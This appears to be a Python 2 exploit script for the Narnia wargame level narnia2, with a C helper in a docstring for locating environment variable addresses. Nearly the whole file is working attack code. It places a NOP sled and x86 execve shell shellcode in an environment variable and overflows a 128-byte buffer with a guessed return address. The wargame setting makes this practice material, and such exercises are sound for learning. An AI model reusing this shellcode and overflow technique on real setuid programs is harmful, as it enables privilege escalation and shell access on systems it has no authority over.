import struct
import subprocess

cmd = "./env-addr"
cmd = "/narnia/narnia2"
shellcode = "\x90"*5000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


start = 0xbffffffa
start = 0xc0000000
start = 0xff000000
addr = start - len(cmd) - len(shellcode)
addr = 0xffffcc46 + 0x100
arg = "A"*128 + str(struct.pack("@I", addr)) * 8
print arg
subprocess.call([cmd, arg], env={'x': shellcode})

print "FAIL!"

"""
Get env-addr with the following:

#include <stdio.h>

int main(int argc, char **argv, char **envp)
{

    while(*envp){
        printf("%p %s\n", *envp, *envp);
        envp++;
    }

    return 0;
}
"""
